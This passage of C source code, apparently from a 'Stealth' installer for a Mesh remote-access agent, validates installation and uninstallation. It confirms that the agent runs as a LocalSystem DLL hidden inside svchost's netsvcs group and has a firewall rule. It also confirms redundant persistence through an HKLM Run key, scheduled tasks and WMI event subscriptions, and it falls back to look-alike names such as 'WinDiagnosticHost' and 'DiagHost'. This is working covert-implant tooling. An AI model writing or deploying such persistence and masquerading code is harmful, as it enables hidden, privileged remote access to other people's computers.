        RegCloseKey(hSvcKey);
    }
    else
    {
        summary.serviceExists = FALSE;
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Service key missing: HKLM\\%ls", serviceKeyPath);
    }

    DWORD typeValue = 0;
    if (Stealth_ReadRegistryDword(HKEY_LOCAL_MACHINE, serviceKeyPath, L"Type", &typeValue))
    {
        summary.serviceType = (typeValue == SERVICE_WIN32_SHARE_PROCESS);
        if (!summary.serviceType)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Service type mismatch: %lu", typeValue);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Unable to read service Type");
    }

    DWORD startValue = 0;
    if (Stealth_ReadRegistryDword(HKEY_LOCAL_MACHINE, serviceKeyPath, L"Start", &startValue))
    {
        summary.serviceStart = (startValue == SERVICE_AUTO_START);
        if (!summary.serviceStart)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Service start type mismatch: %lu", startValue);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Unable to read service Start");
    }

    wchar_t imagePath[512] = {0};
    if (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, serviceKeyPath, L"ImagePath", imagePath, _countof(imagePath), NULL))
    {
        wchar_t imagePathUpper[512] = {0};
        StringCchCopyW(imagePathUpper, _countof(imagePathUpper), imagePath);
        _wcsupr(imagePathUpper);
        summary.serviceImagePath = (wcsstr(imagePathUpper, L"SVCHOST.EXE") != NULL);
        if (!summary.serviceImagePath)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Service ImagePath not svchost: %ls", imagePath);
        }
        summary.serviceGroup = (wcsstr(imagePathUpper, L"-K NETSVCS") != NULL);
        if (!summary.serviceGroup)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Service ImagePath missing netsvcs group: %ls", imagePath);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Unable to read service ImagePath");
    }

    wchar_t objectName[256] = {0};
    if (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, serviceKeyPath, L"ObjectName", objectName, _countof(objectName), NULL))
    {
        summary.serviceAccount = (_wcsicmp(objectName, L"LocalSystem") == 0);
        if (!summary.serviceAccount)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Service account mismatch: %ls", objectName);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Unable to read service ObjectName");
    }

    wchar_t paramsKeyPath[512];
    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);
    wchar_t serviceDll[512] = {0};
    if (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, paramsKeyPath, L"ServiceDll", serviceDll, _countof(serviceDll), NULL))
    {
        summary.serviceDll = (_wcsicmp(serviceDll, paths.dllPath) == 0);
        if (!summary.serviceDll)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] ServiceDll mismatch: %ls", serviceDll);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] ServiceDll not found");
    }

    wchar_t serviceMain[128] = {0};
    if (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, paramsKeyPath, L"ServiceMain", serviceMain, _countof(serviceMain), NULL))
    {
        summary.serviceMain = (_wcsicmp(serviceMain, L"Stealth_SvchostServiceMain") == 0);
        if (!summary.serviceMain)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] ServiceMain mismatch: %ls", serviceMain);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] ServiceMain missing");
    }

    DWORD unloadValue = 0;
    if (Stealth_ReadRegistryDword(HKEY_LOCAL_MACHINE, paramsKeyPath, L"ServiceDllUnloadOnStop", &unloadValue))
    {
        summary.serviceUnload = (unloadValue == 1);
        if (!summary.serviceUnload)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] ServiceDllUnloadOnStop mismatch: %lu", unloadValue);
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] ServiceDllUnloadOnStop missing");
    }

    wchar_t serviceDllHash[128] = {0};
    if (Stealth_ReadRegistryString(HKEY_LOCAL_MACHINE, paramsKeyPath, L"ServiceDllHash", serviceDllHash, _countof(serviceDllHash), NULL))
    {
        summary.serviceDllHash = FALSE;
        if (serviceDllHash[0] != L'\0')
        {
            wchar_t actualHash[STEALTH_SHA256_STRING_LENGTH + 1] = {0};
            if (Stealth_ComputeFileSha256W(paths.dllPath, actualHash, _countof(actualHash)) &&
                _wcsicmp(actualHash, serviceDllHash) == 0)
            {
                summary.serviceDllHash = TRUE;
            }
        }
        if (!summary.serviceDllHash)
        {
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] ServiceDllHash mismatch");
        }
    }
    else
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] ServiceDllHash missing");
    }

    // DACL validation
    summary.serviceDacl = MeshService_ValidateServiceDaclByName(serviceKeyName, NULL, 0);
    if (!summary.serviceDacl)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Service DACL mismatch");
    }

    summary.serviceRunning = Stealth_ServiceIsRunning(serviceKeyName);
    if (!summary.serviceRunning)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Service not running");
    }

    // Firewall rule validation
    wchar_t svchostPath[MAX_PATH] = {0};
    const wchar_t* hostToValidate = NULL;
    if (MeshInstaller_CombinePath(svchostPath, _countof(svchostPath), paths.installDir, L"svchost.exe") &&
        GetFileAttributesW(svchostPath) != INVALID_FILE_ATTRIBUTES)
    {
        hostToValidate = svchostPath;
    }
    else
    {
        hostToValidate = L"C:\\Windows\\System32\\svchost.exe";
    }

    summary.firewallRule = Stealth_WaitForFirewallRuleConvergence(
        serviceKeyName,
        hostToValidate,
        paths.exePath,
        STEALTH_FIREWALL_SETTLE_TIMEOUT_MS);
    if (!summary.firewallRule)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Firewall rule missing or mismatched for %ls", serviceKeyName);
    }

    // Persistence validation
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
    if (persistence == NULL)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Persistence profile unavailable");
    }
    else
    {
        summary.runKey = TRUE;
        if (persistence->runKey != 0)
        {
            wchar_t runValue[512] = {0};
            summary.runKey = Stealth_RunKeyValueExists(serviceKeyName, runValue, _countof(runValue));
            if (!summary.runKey)
            {
                summary.success = FALSE;
                Stealth_LogInstallEvent(L"[VALIDATION] Run key missing for %ls", serviceKeyName);
            }
        }

        StealthPersistenceState state;
        if (Stealth_LoadPersistenceState(&state))
        {
            summary.persistenceState = TRUE;
            wchar_t prefixCandidates[10][STEALTH_TASK_NAME_MAX] = {0};
            size_t prefixCount = Stealth_BuildTaskPrefixCandidates(
                persistence,
                serviceDisplayName,
                serviceKeyName,
                prefixCandidates,
                _countof(prefixCandidates));

            if (persistence->autorunTask.enabled)
            {
                summary.autorunTask = (state.AutorunTask[0] != L'\0' && StealthResilience_TaskExists(state.AutorunTask));
                if (!summary.autorunTask)
                {
                    wchar_t fallbackTask[STEALTH_TASK_NAME_MAX] = {0};
                    if (Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-Autorun-", fallbackTask, _countof(fallbackTask)))
                    {
                        summary.autorunTask = TRUE;
                        Stealth_RecordPersistenceTask(&state, fallbackTask, FALSE);
                        Stealth_SavePersistenceState(&state);
                    }
                    else
                    {
                        summary.success = FALSE;
                        Stealth_LogInstallEvent(L"[VALIDATION] Autorun task missing");
                    }
                }
            }
            else
            {
                summary.autorunTask = TRUE;
            }

            if (persistence->restartTask.enabled)
            {
                summary.restartTask = (state.RestartTask[0] != L'\0' && StealthResilience_TaskExists(state.RestartTask));
                summary.wmiSubscription = (state.WmiFilter[0] != L'\0' && state.WmiConsumer[0] != L'\0' &&
                                           StealthResilience_WmiSubscriptionExists(state.WmiFilter, state.WmiConsumer));

                if (!summary.restartTask)
                {
                    wchar_t fallbackTask[STEALTH_TASK_NAME_MAX] = {0};
                    if (Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-RestartOnStop-", fallbackTask, _countof(fallbackTask)))
                    {
                        summary.restartTask = TRUE;
                        Stealth_RecordPersistenceTask(&state, fallbackTask, TRUE);
                        Stealth_SavePersistenceState(&state);
                    }
                }

                if (!summary.wmiSubscription)
                {
                    wchar_t fallbackFilter[128] = {0};
                    wchar_t fallbackConsumer[128] = {0};
                    if (Stealth_FindWmiByPrefixCandidates(
                            prefixCandidates,
                            prefixCount,
                            fallbackFilter,
                            _countof(fallbackFilter),
                            fallbackConsumer,
                            _countof(fallbackConsumer)))
                    {
                        summary.wmiSubscription = TRUE;
                        Stealth_RecordPersistenceWmi(&state, fallbackFilter, fallbackConsumer);
                        Stealth_SavePersistenceState(&state);
                    }
                }

                if (!summary.restartTask && !summary.wmiSubscription)
                {
                    summary.success = FALSE;
                    Stealth_LogInstallEvent(L"[VALIDATION] Restart persistence missing (task/WMI)");
                }
            }
            else
            {
                summary.restartTask = TRUE;
                summary.wmiSubscription = TRUE;
            }
        }
        else
        {
            summary.persistenceState = FALSE;
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Persistence state file missing");
        }
    }

    Stealth_LogInstallEvent(L"[VALIDATION] %S validation %ls", summary.phase, summary.success ? L"PASSED" : L"FAILED");
    Stealth_PrintValidationJson(&summary);
    return summary.success;
}

BOOL Stealth_RunInstallValidation(void)
{
    return Stealth_RunInstallValidationInternal("install");
}

BOOL Stealth_RunUpdateValidation(void)
{
    return Stealth_RunInstallValidationInternal("update");
}

typedef struct StealthUninstallValidationSummary
{
    const char* phase;
    BOOL success;
    BOOL serviceAbsent;
    BOOL serviceKeyAbsent;
    BOOL svchostGroupAbsent;
    BOOL firewallRuleAbsent;
    BOOL filesRemoved;
    BOOL installDirRemoved;
    BOOL logsDirRemoved;
    BOOL runKeyRemoved;
    BOOL tasksRemoved;
    BOOL wmiRemoved;
    BOOL persistenceStateRemoved;
} StealthUninstallValidationSummary;

static void Stealth_PrintUninstallValidationJson(const StealthUninstallValidationSummary* summary)
{
    if (summary == NULL) { return; }
    printf("{\"success\":%s,", summary->success ? "true" : "false");
    if (summary->phase != NULL)
    {
        printf("\"phase\":\"%s\",", summary->phase);
    }
    printf("\"checks\":{");
    printf("\"serviceAbsent\":%s,", summary->serviceAbsent ? "true" : "false");
    printf("\"serviceKeyAbsent\":%s,", summary->serviceKeyAbsent ? "true" : "false");
    printf("\"svchostGroupAbsent\":%s,", summary->svchostGroupAbsent ? "true" : "false");
    printf("\"firewallRuleAbsent\":%s,", summary->firewallRuleAbsent ? "true" : "false");
    printf("\"filesRemoved\":%s,", summary->filesRemoved ? "true" : "false");
    printf("\"installDirRemoved\":%s,", summary->installDirRemoved ? "true" : "false");
    printf("\"logsDirRemoved\":%s,", summary->logsDirRemoved ? "true" : "false");
    printf("\"runKeyRemoved\":%s,", summary->runKeyRemoved ? "true" : "false");
    printf("\"tasksRemoved\":%s,", summary->tasksRemoved ? "true" : "false");
    printf("\"wmiRemoved\":%s,", summary->wmiRemoved ? "true" : "false");
    printf("\"persistenceStateRemoved\":%s", summary->persistenceStateRemoved ? "true" : "false");
    printf("}}\n");
}

BOOL Stealth_RunUninstallValidation(void)
{
    StealthInstallPaths paths;
    StealthUninstallValidationSummary summary;
    ZeroMemory(&summary, sizeof(summary));
    summary.phase = "uninstall";
    summary.success = TRUE;

    Stealth_SetInstallerLogPathToTemp(L"MeshInstaller-UninstallValidation.log");

    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();

    if (!Stealth_GetInstallPaths(&paths))
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Failed to resolve install paths for uninstall validation");
        summary.success = FALSE;
        Stealth_PrintUninstallValidationJson(&summary);
        return FALSE;
    }

    // Service absence
    summary.serviceAbsent = FALSE;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm != NULL)
    {
        SC_HANDLE svc = OpenServiceW(scm, serviceKeyName, SERVICE_QUERY_STATUS);
        if (svc != NULL)
        {
            CloseServiceHandle(svc);
            summary.serviceAbsent = FALSE;
        }
        else
        {
            summary.serviceAbsent = (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST);
        }
        CloseServiceHandle(scm);
    }
    if (!summary.serviceAbsent)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Service still present after uninstall: %ls", serviceKeyName);
    }

    // Service key absence
    wchar_t serviceKeyPath[512];
    _snwprintf_s(serviceKeyPath, _countof(serviceKeyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceKeyName);
    HKEY hSvcKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, serviceKeyPath, 0, KEY_QUERY_VALUE, &hSvcKey) == ERROR_SUCCESS)
    {
        summary.serviceKeyAbsent = FALSE;
        RegCloseKey(hSvcKey);
    }
    else
    {
        summary.serviceKeyAbsent = TRUE;
    }
    if (!summary.serviceKeyAbsent)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Service registry key still present: HKLM\\%ls", serviceKeyPath);
    }

    // Svchost group membership absence
    summary.svchostGroupAbsent = TRUE;
    HKEY hSvchost = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                      0, KEY_QUERY_VALUE, &hSvchost) == ERROR_SUCCESS)
    {
        DWORD type = 0;
        DWORD cb = 0;
        if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
        {
            wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
            if (buf && RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
            {
                buf[cb / sizeof(wchar_t)] = L'\0';
                buf[cb / sizeof(wchar_t) + 1] = L'\0';
                for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
                {
                    if (_wcsicmp(p, serviceKeyName) == 0)
                    {
                        summary.svchostGroupAbsent = FALSE;
                        break;
                    }
                }
            }
            if (buf) { free(buf); }
        }
        RegCloseKey(hSvchost);
    }
    if (!summary.svchostGroupAbsent)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Service still in Svchost netsvcs list: %ls", serviceKeyName);
    }

    // Firewall rule absence
    summary.firewallRuleAbsent = !Stealth_CheckFirewallRuleExists(serviceKeyName);
    if (!summary.firewallRuleAbsent)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Firewall rule still present for %ls", serviceKeyName);
    }

    // Files and directories removed
    summary.filesRemoved = (GetFileAttributesW(paths.exePath) == INVALID_FILE_ATTRIBUTES &&
                            GetFileAttributesW(paths.dllPath) == INVALID_FILE_ATTRIBUTES &&
                            GetFileAttributesW(paths.dbPath) == INVALID_FILE_ATTRIBUTES &&
                            GetFileAttributesW(paths.logPath) == INVALID_FILE_ATTRIBUTES &&
                            GetFileAttributesW(paths.confPath) == INVALID_FILE_ATTRIBUTES);
    if (!summary.filesRemoved)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] One or more installed files remain under %ls", paths.installDir);
    }

    summary.installDirRemoved = (GetFileAttributesW(paths.installDir) == INVALID_FILE_ATTRIBUTES);
    summary.logsDirRemoved = (GetFileAttributesW(paths.logsDir) == INVALID_FILE_ATTRIBUTES);
    if (!summary.installDirRemoved || !summary.logsDirRemoved)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Install/log directories still present");
    }

    // Run key removed
    summary.runKeyRemoved = !Stealth_RunKeyValueExists(serviceKeyName, NULL, 0);
    if (!summary.runKeyRemoved)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Run key entry still present for %ls", serviceKeyName);
    }

    // Scheduled tasks and WMI removed
    wchar_t prefixCandidates[10][STEALTH_TASK_NAME_MAX] = {0};
    size_t prefixCount = Stealth_BuildTaskPrefixCandidates(
        persistence,
        serviceDisplayName,
        serviceKeyName,
        prefixCandidates,
        _countof(prefixCandidates));

    wchar_t existingTask[STEALTH_TASK_NAME_MAX] = {0};
    BOOL autorunExists = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-Autorun-", existingTask, _countof(existingTask));
    BOOL restartExists = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-RestartOnStop-", existingTask, _countof(existingTask));
    BOOL anyTaskExists = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, NULL, existingTask, _countof(existingTask));
    summary.tasksRemoved = (!autorunExists && !restartExists && !anyTaskExists);
    if (!summary.tasksRemoved)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Scheduled tasks still present for %ls", serviceKeyName);
    }

    wchar_t filterName[128] = {0};
    wchar_t consumerName[128] = {0};
    summary.wmiRemoved = !Stealth_FindWmiByPrefixCandidates(
        prefixCandidates,
        prefixCount,
        filterName,
        _countof(filterName),
        consumerName,
        _countof(consumerName));
    if (!summary.wmiRemoved)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] WMI subscriptions still present for %ls", serviceKeyName);
    }

    StealthPersistenceState state;
    summary.persistenceStateRemoved = !Stealth_LoadPersistenceState(&state);
    if (!summary.persistenceStateRemoved)
    {
        summary.success = FALSE;
        Stealth_LogInstallEvent(L"[VALIDATION] Persistence state file still present");
    }

    Stealth_LogInstallEvent(L"[VALIDATION] uninstall validation %ls", summary.success ? L"PASSED" : L"FAILED");
    Stealth_PrintUninstallValidationJson(&summary);
    return summary.success;
}
static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->runKey == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Run key persistence disabled");
        return;
    }

    HKEY hKey;
    const wchar_t* runKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        wchar_t cmd[MAX_PATH];
        if (GetSystemDirectoryW(cmd, MAX_PATH) > 0)
        {
            size_t len = wcslen(cmd);
            if (len < MAX_PATH - 1) { wcscat_s(cmd, MAX_PATH, L"\\sc.exe"); }
        }
        else
        {
            wcscpy_s(cmd, MAX_PATH, L"sc.exe");
        }
        wchar_t value[256];
        StringCchPrintfW(value, 256, L"\"%s\" start %s", cmd, serviceName);
        RegSetValueExW(hKey, serviceName, 0, REG_SZ, (const BYTE*)value, (DWORD)((wcslen(value) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        Stealth_LogInstallEvent(L"Configured Run key for %ls", serviceName);
    }
    else
    {
        Stealth_DebugLastErrorW(L"RegCreateKeyExW (RunKey)");
        Stealth_LogInstallEvent(L"Failed to configure Run key for %ls", serviceName);
    }
}

static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return; }

    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return;
    }

    LONG result = RegDeleteValueW(hKey, serviceName);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS)
    {
        Stealth_LogInstallEvent(L"Removed Run key for %ls", serviceName);
    }
    else if (result != ERROR_FILE_NOT_FOUND)
    {
        Stealth_LogInstallEvent(L"Unable to remove Run key for %ls (error=%ld)", serviceName, result);
    }
}

static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity)
{
    if (taskName == NULL || capacity == 0 || taskName[0] == L'\0') { return FALSE; }
    if (taskName[0] == L'\\') { return TRUE; }

    wchar_t buffer[STEALTH_TASK_NAME_MAX] = {0};
    if (FAILED(StringCchCopyW(buffer, _countof(buffer), taskName))) { return FALSE; }
    if (FAILED(StringCchPrintfW(taskName, capacity, L"\\%s", buffer))) { return FALSE; }
    return TRUE;
}

static BOOL Stealth_CopyTaskNameFromUtf8(const char* source, wchar_t* dest, size_t destLen)
{
    if (dest == NULL || destLen == 0) { return FALSE; }
    dest[0] = L'\0';
    if (source == NULL || source[0] == '\0') { return FALSE; }

    MeshService_CopyBrandingTextToWide(source, dest, destLen);
    if (dest[0] == L'\0') { return FALSE; }
    return Stealth_NormalizeTaskNameInplace(dest, destLen);
}

static BOOL Stealth_FormatDefaultTaskName(const wchar_t* base, const wchar_t* suffix, wchar_t* dest, size_t destLen)
{
    if (dest == NULL || destLen == 0 || base == NULL || base[0] == L'\0' || suffix == NULL) { return FALSE; }
    if (FAILED(StringCchPrintfW(dest, destLen, L"\\%s%s", base, suffix))) { return FALSE; }
    return TRUE;
}

static void Stealth_SanitizeTaskHint(const wchar_t* input, wchar_t* output, size_t outputSize)
{
    if (output == NULL || outputSize == 0) { return; }
    output[0] = L'\0';
    if (input == NULL || input[0] == L'\0') { return; }

    size_t i = 0;
    size_t j = 0;
    while (input[i] != L'\0' && j < outputSize - 1)
    {
        wchar_t c = input[i++];
        if ((c >= L'0' && c <= L'9') ||
            (c >= L'a' && c <= L'z') ||
            (c >= L'A' && c <= L'Z'))
        {
            output[j++] = c;
        }
        else
        {
            output[j++] = L'_';
        }
    }
    output[j] = L'\0';
}

static void Stealth_BuildTaskPrefixFromHint(const wchar_t* hint, const wchar_t* fallback, wchar_t* output, size_t outputSize)
{
    if (output == NULL || outputSize == 0) { return; }
    output[0] = L'\0';

    if (hint != NULL && hint[0] != L'\0')
    {
        Stealth_SanitizeTaskHint(hint, output, outputSize);
    }
    if (output[0] == L'\0' && fallback != NULL && fallback[0] != L'\0')
    {
        Stealth_SanitizeTaskHint(fallback, output, outputSize);
    }
    if (output[0] == L'\0')
    {
        StringCchCopyW(output, outputSize, L"WinDiagnosticHost");
    }
}

static void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName)
{
    wchar_t tempPath[MAX_PATH] = {0};
    if (GetTempPathW(_countof(tempPath), tempPath) == 0) { return; }

    const wchar_t* name = (fileName != NULL && fileName[0] != L'\0') ? fileName : L"MeshInstaller-UninstallValidation.log";
    wchar_t tempLog[MAX_PATH] = {0};
    if (MeshInstaller_CombinePath(tempLog, _countof(tempLog), tempPath, name))
    {
        wcsncpy_s(g_InstallLogPath, _countof(g_InstallLogPath), tempLog, _TRUNCATE);
        g_HaveInstallLogPath = TRUE;
    }
}

static BOOL Stealth_AddTaskCandidate(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t* count, size_t capacity, const wchar_t* name)
{
    if (candidates == NULL || count == NULL || name == NULL || name[0] == L'\0') { return FALSE; }
    for (size_t i = 0; i < *count; ++i)
    {
        if (_wcsicmp(candidates[i], name) == 0) { return FALSE; }
    }
    if (*count >= capacity) { return FALSE; }
    if (FAILED(StringCchCopyW(candidates[*count], STEALTH_TASK_NAME_MAX, name))) { return FALSE; }
    (*count)++;
    return TRUE;
}

static size_t Stealth_BuildTaskPrefixCandidates(
    const mesh_persistence_profile_t* persistence,
    const wchar_t* serviceDisplayName,
    const wchar_t* serviceKeyName,
    wchar_t candidates[][STEALTH_TASK_NAME_MAX],
    size_t capacity)
{
    if (candidates == NULL || capacity == 0) { return 0; }
    for (size_t i = 0; i < capacity; ++i)
    {
        candidates[i][0] = L'\0';
    }

    wchar_t autorunHint[STEALTH_TASK_NAME_MAX] = {0};
    wchar_t restartHint[STEALTH_TASK_NAME_MAX] = {0};
    wchar_t wmiClass[STEALTH_TASK_NAME_MAX] = {0};
    if (persistence != NULL)
    {
        MeshService_CopyBrandingTextToWide(persistence->autorunTask.taskName, autorunHint, _countof(autorunHint));
        MeshService_CopyBrandingTextToWide(persistence->restartTask.taskName, restartHint, _countof(restartHint));
        MeshService_CopyBrandingTextToWide(persistence->restartTask.wmiClass, wmiClass, _countof(wmiClass));
    }

    wchar_t exeBase[STEALTH_TASK_NAME_MAX] = {0};
    wchar_t exeName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), exeName, _countof(exeName));
    if (exeName[0] != L'\0')
    {
        wchar_t* dot = wcsrchr(exeName, L'.');
        if (dot != NULL) { *dot = L'\0'; }
        Stealth_BuildTaskPrefixFromHint(exeName, NULL, exeBase, _countof(exeBase));
    }

    size_t count = 0;
    wchar_t candidate[STEALTH_TASK_NAME_MAX] = {0};
    Stealth_BuildTaskPrefixFromHint(autorunHint, serviceKeyName, candidate, _countof(candidate));
    Stealth_AddTaskCandidate(candidates, &count, capacity, candidate);
    Stealth_BuildTaskPrefixFromHint(restartHint, serviceKeyName, candidate, _countof(candidate));
    Stealth_AddTaskCandidate(candidates, &count, capacity, candidate);
    Stealth_BuildTaskPrefixFromHint(wmiClass, serviceKeyName, candidate, _countof(candidate));
    Stealth_AddTaskCandidate(candidates, &count, capacity, candidate);
    Stealth_BuildTaskPrefixFromHint(serviceKeyName, NULL, candidate, _countof(candidate));
    Stealth_AddTaskCandidate(candidates, &count, capacity, candidate);
    Stealth_BuildTaskPrefixFromHint(serviceDisplayName, serviceKeyName, candidate, _countof(candidate));
    Stealth_AddTaskCandidate(candidates, &count, capacity, candidate);
    if (exeBase[0] != L'\0')
    {
        Stealth_AddTaskCandidate(candidates, &count, capacity, exeBase);
    }

    Stealth_AddTaskCandidate(candidates, &count, capacity, L"WinDiagnosticHost");
    Stealth_AddTaskCandidate(candidates, &count, capacity, L"DiagHost");
    return count;
}

static BOOL Stealth_FindTaskByPrefixCandidates(
    wchar_t candidates[][STEALTH_TASK_NAME_MAX],
    size_t count,
    const wchar_t* token,
    wchar_t* outTaskPath,
    size_t outTaskPathCch)
{
    if (outTaskPath == NULL || outTaskPathCch == 0) { return FALSE; }
    outTaskPath[0] = L'\0';
    if (candidates == NULL || count == 0) { return FALSE; }

    for (size_t i = 0; i < count; ++i)
    {
        if (candidates[i][0] == L'\0') { continue; }
        wchar_t prefix[STEALTH_TASK_NAME_MAX] = {0};
        if (FAILED(StringCchPrintfW(prefix, _countof(prefix), L"%s-", candidates[i]))) { continue; }
        if (StealthResilience_FindTaskByPrefix(prefix, token, outTaskPath, outTaskPathCch))
        {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL Stealth_FindWmiByPrefixCandidates(
    wchar_t candidates[][STEALTH_TASK_NAME_MAX],
    size_t count,
    wchar_t* outFilterName,
    size_t outFilterNameCch,
    wchar_t* outConsumerName,
    size_t outConsumerNameCch)
{
    if (outFilterName == NULL || outFilterNameCch == 0 ||
        outConsumerName == NULL || outConsumerNameCch == 0)
    {
        return FALSE;
    }
    outFilterName[0] = L'\0';
    outConsumerName[0] = L'\0';
    if (candidates == NULL || count == 0) { return FALSE; }

    for (size_t i = 0; i < count; ++i)
    {
        if (candidates[i][0] == L'\0') { continue; }
        wchar_t filterPrefix[256] = {0};
        wchar_t consumerPrefix[256] = {0};
        if (FAILED(StringCchPrintfW(filterPrefix, _countof(filterPrefix), L"%s_StopFilter_", candidates[i])))
        {
            continue;
        }
        if (FAILED(StringCchPrintfW(consumerPrefix, _countof(consumerPrefix), L"%s_RestartConsumer_", candidates[i])))
        {
            continue;
        }
        if (StealthResilience_FindWmiSubscriptionsByPrefix(
                filterPrefix,
                consumerPrefix,
                outFilterName,
                outFilterNameCch,
                outConsumerName,
                outConsumerNameCch))
        {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wchar_t* context)
{
    if (taskName == NULL || taskName[0] == L'\0') { return FALSE; }

    wchar_t sysDir[MAX_PATH];
    wchar_t cmdLine[1024];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) { return FALSE; }

    if (FAILED(StringCchPrintfW(cmdLine, _countof(cmdLine), L"\"%s\\schtasks.exe\" /Delete /TN \"%s\" /F", sysDir, taskName)))
    {
        return FALSE;
    }

    if (Stealth_RunCommand(cmdLine, context))
    {
        Stealth_LogInstallEvent(L"Removed scheduled task %ls", taskName);
        return TRUE;
    }

    Stealth_LogInstallEvent(L"Scheduled task %ls removal reported failure", taskName);
    return FALSE;
}

